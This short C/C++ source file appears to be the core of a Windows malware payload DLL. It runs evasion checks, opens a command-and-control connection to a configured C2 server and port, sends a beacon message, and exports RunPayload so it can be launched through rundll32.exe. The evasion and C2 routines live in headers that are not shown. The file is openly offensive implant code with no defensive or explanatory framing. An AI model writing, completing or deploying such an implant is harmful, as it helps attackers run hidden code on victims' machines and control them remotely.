#include "payload.h"
#include "payload_config.h"
#include "evasion.h"
#include "c2_communication_fixed.h"
#include <windows.h>
#include <stdio.h>

void RunPayload() {
	// Run evasion checks first
	if (!RunEvasionChecks()) {
		printf("Evasion checks failed. Exiting.\n");
		return;
	}

	// Initialize C2 communication
	if (!InitC2Communication(C2_SERVER, C2_PORT)) {
		printf("Failed to initialize C2 communication.\n");
		return;
	}

	// Main payload logic
	printf("Payload executed successfully!\n");
	SendC2Message("Payload executed");

	// Cleanup
	CleanupC2Communication();
}

// Export the function for rundll32.exe
__declspec(dllexport) void CALLBACK RunPayload(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
	RunPayload();
}